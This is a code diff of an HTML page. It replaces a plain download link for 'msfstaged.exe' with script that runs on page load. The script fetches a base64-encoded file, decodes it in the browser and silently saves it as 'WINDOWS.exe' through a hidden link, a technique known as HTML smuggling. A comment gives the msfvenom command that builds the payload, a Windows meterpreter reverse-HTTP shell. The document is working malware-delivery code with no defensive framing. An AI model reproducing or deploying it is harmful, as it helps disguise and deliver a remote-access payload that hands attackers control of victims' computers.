@@ -1,5 +1,43 @@
 <html>
     <body>
-      <a href="/msfstaged.exe" download="msfstaged.exe">DownloadMe</a>
-   </body>
+        <script>
+			//sudo msfvenom -p windows/x64/meterpreter/reverse_http LHOST=eth0 LPORT=443 -f exe -o test_http.exe
+            function base64ToArrayBuffer(base64) {
+                var binary_string = window.atob(base64);
+                var len = binary_string.length;
+                var bytes = new Uint8Array(len);
+                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+                return bytes.buffer;
+            }
+
+            var filePath = 'base64.txt'; // Update this with the actual path
+
+            // Use fetch to retrieve the file content as ArrayBuffer
+            fetch(filePath)
+                .then(response => response.text())
+                .then(buffer => {
+					var data = base64ToArrayBuffer(buffer)
+                    var blob = new Blob([data], { type: 'octet/stream' }); // Set the appropriate MIME type
+                    var fileName = 'WINDOWS.exe';
+
+                    var a = document.createElement('a');
+                    document.body.appendChild(a);
+                    a.style = 'display: none';
+
+                    var url = window.URL.createObjectURL(blob);
+
+                    // Check if the browser supports msSaveBlob
+                    if (navigator.msSaveBlob) {
+                        navigator.msSaveBlob(blob, fileName);
+                    } else {
+                        a.href = url;
+                        a.download = fileName;
+                        a.click();
+                    }
+
+                    window.URL.revokeObjectURL(url);
+                })
+                .catch(error => console.error('Error fetching file:', error));
+        </script>
+    </body>
 </html>
